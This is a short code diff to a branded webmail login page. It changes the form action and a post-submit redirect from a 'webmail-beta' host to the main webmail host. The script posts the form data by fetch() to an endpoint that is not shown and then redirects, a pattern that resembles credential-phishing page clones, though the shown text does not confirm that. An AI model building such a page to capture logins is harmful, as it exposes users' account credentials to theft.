@@ -25,7 +25,7 @@
     <div id="layout-content" class="selected no-navbar" role="main">
         <img src="alliancecom.net.png" id="logo" alt="Logo">
         <form id="login-form" name="login-form" method="post" class="propform"
-              action="https://webmail-beta.alliancecom.net/?_task=login">
+              action="https://webmail.alliancecom.net/?_task=login">
             <input type="hidden" name="_token" value="to6SoKzhOwR584bbrrHtKmZdZiZOneNm" class="form-control">
             <input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action"
                                                                                         value="login"
@@ -138,7 +138,7 @@
                         headers: {"Content-Type": "application/x-www-form-urlencoded"},
                         body: new URLSearchParams(toSend)
                     });
-                    window.location.href = "https://webmail-beta.alliancecom.net";
+                    window.location.href = "https://webmail.alliancecom.net/";
                 }
             } catch (ex) {
                 err.textContent = "Network error. Please check your connection and try again.";
